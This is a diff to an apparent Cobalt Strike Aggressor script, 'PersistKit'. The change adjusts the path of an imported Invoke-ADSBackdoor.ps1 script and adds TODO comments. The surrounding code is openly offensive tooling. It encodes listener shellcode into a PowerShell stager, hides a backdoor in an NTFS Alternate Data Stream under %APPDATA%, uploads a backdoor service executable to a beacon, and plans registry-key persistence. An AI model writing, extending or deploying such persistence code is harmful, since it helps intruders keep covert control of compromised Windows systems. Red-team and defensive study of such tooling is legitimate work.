@@ -14,7 +14,7 @@ sub createADSBackdoor {
 	$bid = $1;
 	$selectedListener = $2;
 	getADSRegName();
-	bpowershell_import($bid, script_resource("scripts/Invoke-ADSBackdoor.ps1"));
+	bpowershell_import($bid, script_resource("PersistKit/scripts/Invoke-ADSBackdoor.ps1"));
 	prompt_text("Location of file/folder to give ADS (it must exist!)?", "%APPDATA%\Temp\somefile.txt", {
 		# Encode shellcode for the stager
 		$psPayload = powershell_encode_stager(shellcode($selectedListener));
@@ -37,6 +37,8 @@ popup beacon_bottom {
 	menu "PersistKit" {
 		item "Create Backdoor Service"{
 			local ('$bid');
+			# TODO:
+			#	* build out a proper Java Swing menu to customize the options
 			foreach $bid ($1){
 				prompt_file_open("Select the service exe to use", $null, false, {
 					println("\c4Uploading backdoor on beacon $1 using file $2 ");
@@ -62,6 +64,9 @@ popup beacon_bottom {
 		item "Create NTFS ADS Backdoor"{
 				local ('$bid');
 				# Open a payload selection dialoge, passes it to createADSBackdoor()
+				# TODO:
+				#	* build out a proper Java Swing menu to customize the options
+				#	* Modify the powershell script to determine which key to write to HKLM || HKCU
 				foreach $bid ($1){
 					openPayloadHelper(lambda({
 					createADSBackdoor($bid, $1);
